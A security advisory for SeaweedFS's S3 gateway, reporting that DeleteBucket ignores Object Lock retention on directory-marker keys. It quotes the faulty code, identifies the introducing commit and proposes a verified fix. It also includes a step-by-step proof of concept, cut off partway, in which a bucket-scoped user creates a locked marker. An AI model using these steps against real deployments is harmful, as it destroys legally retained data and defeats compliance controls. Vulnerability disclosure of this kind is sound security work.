title: DeleteBucket ignores Object Lock on directory-marker keys
summary:
### Summary

`DeleteBucket` refuses to delete a bucket holding objects under an active Object Lock, but the check behind that refusal never examines directory entries. A directory-marker object, an S3 key ending in `/`, can carry retention or legal hold, and `DeleteObject` enforces it; `DeleteBucket` cannot see it. An ordinary S3 user scoped to one bucket destroys an object under COMPLIANCE retention until 2036, and the rest of the bucket with it, in one call. S3 API only: no filer access, no admin rights.

### Details

In `weed/s3api/s3_objectlock/object_lock_check.go:148-168`, `EntryHasActiveLock` is only reached in the `else` branch, so a directory entry is recursed into and never tested:

```go
if entry.IsDirectory {
    if entry.Name == s3_constants.VersionsFolder {
        ... checkVersionsForLocksWithClient(...)
    } else {
        ... recursivelyCheckLocksWithClient(...)   // never lock-checked
    }
} else {
    if EntryHasActiveLock(entry, currentTime) {    // non-directories only
```

A directory-marker object *is* a directory entry, and it does carry the lock. Filer listing of `/buckets/lockb/`:

```
FullPath : /buckets/lockb/records
Mode     : 2147484153   (os.ModeDir|0771)
Extended : Seaweed-X-Amz-Object-Lock-Mode: COMPLIANCE
           Seaweed-X-Amz-Retention-Until-Date: 2103706177
```

So `hasObjectsWithActiveLocks` reports no locks and `DeleteBucketHandler` (`weed/s3api/s3api_bucket_handlers.go:458-470`) proceeds to `s3a.rm(..., isRecursive=true)` at `:488`. The whole bucket goes because `-s3.allowDeleteBucketNotEmpty` defaults to **true** (`weed/command/server.go:180`, `filer.go:147`, `mini.go:394`, `s3.go:115`), leaving the lock gate as the only guard.

The gateway's own delete path treats the same entry as lockable: `weed/s3api/s3api_directory_marker.go:55` calls `enforceObjectLockOnEntry` and returns `ErrAccessDenied` (`:81`, `:87` cover its version history). The two paths disagree.

Introduced in 4.45 by `2a97e08ca` (#10988, "s3: cover the directory marker key with object lock"), which enforced the lock in the marker delete but left `object_lock_check.go` untouched. 4.40-4.44 are unaffected: there `PutObjectRetention` on a key ending in `/` fails, so no lock can exist to miss.

**Fix**: lock-check the directory entry before recursing.

```go
if entry.IsDirectory {
    if EntryHasActiveLock(entry, currentTime) {
        *hasLocks = true
        return true, nil
    }
    ...
```

I applied exactly this and rebuilt: `delete-bucket` on the locked marker returns `BucketNotEmpty`, and a bucket holding an *unlocked* marker plus ordinary objects still deletes normally.

### PoC

Built from `68a175ef6` (4.45), default flags:

```
weed server -dir=./data -ip=127.0.0.1 -filer -s3 -s3.port=8333 -s3.config=./s3.json
```

Attacker is a non-admin identity confined to one bucket:

```json
{"name":"tenant","credentials":[{"accessKey":"tkey","secretKey":"tsecret"}],
 "actions":["Read:lockb/*","Write:lockb/*","List:lockb","List:lockb/*",
            "Tagging:lockb/*","DeleteBucket:lockb"]}
```

```
$ export AWS_EC2_METADATA_DISABLED=true AWS_DEFAULT_REGION=us-east-1
$ EP=http://127.0.0.1:8333 ; printf '' > empty

$ AWS_ACCESS_KEY_ID=adminkey AWS_SECRET_ACCESS_KEY=adminsecret \
    aws --endpoint-url $EP s3api create-bucket --bucket lockb --object-lock-enabled-for-bucket
{
    "Location": "/lockb"
}

$ export AWS_ACCESS_KEY_ID=tkey AWS_SECRET_ACCESS_KEY=tsecret

$ aws --endpoint-url $EP s3api create-bucket --bucket proof-not-admin
An error occurred (AccessDenied) when calling the CreateBucket operation: Access Denied.

$ aws --endpoint-url $EP s3api put-object --bucket lockb --key 'records/' --body empty
{
    "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\""
}

$ aws --endpoint-url $EP s3api put-object-retention --bucket lockb --key 'records/' \
      --retention "Mode=COMPLIANCE,RetainUntilDate=2036-08-30T10:49:37Z"

$ aws --endpoint-ur...
